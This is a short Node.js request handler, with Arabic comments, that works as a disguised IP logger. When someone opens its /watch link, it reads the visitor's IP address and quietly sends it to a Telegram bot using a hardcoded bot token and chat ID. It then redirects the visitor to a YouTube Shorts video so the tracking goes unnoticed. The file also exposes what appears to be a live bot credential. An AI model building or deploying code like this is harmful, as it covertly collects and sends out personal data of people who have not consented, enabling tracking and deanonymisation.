const http = require('http');
const https = require('https');

const TELEGRAM_TOKEN = '8497652334:AAFF0E0w2b11XSzs48a6Nq3EbhObocc8hkU';
const CHAT_ID = '6630829302';

module.exports = (req, res) => {
    if (req.url.startsWith('/watch')) {
        const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
        const message = `🎯 تم رصيد زيارة جديدة!\n🌐 الـ IP: ${visitorIp}`;
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
        
        https.get(telegramUrl, (tgRes) => {
            // تم الإرسال بنجاح
        }).on('error', (e) => {
            console.error(e);
        });

        res.writeHead(302, { Location: 'https://youtube.com/shorts/bN9h2oRnLB4?si=kXhF5Q_P-ER2yazA_ID' });
        res.end();
    } else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Not Found');
    }
};
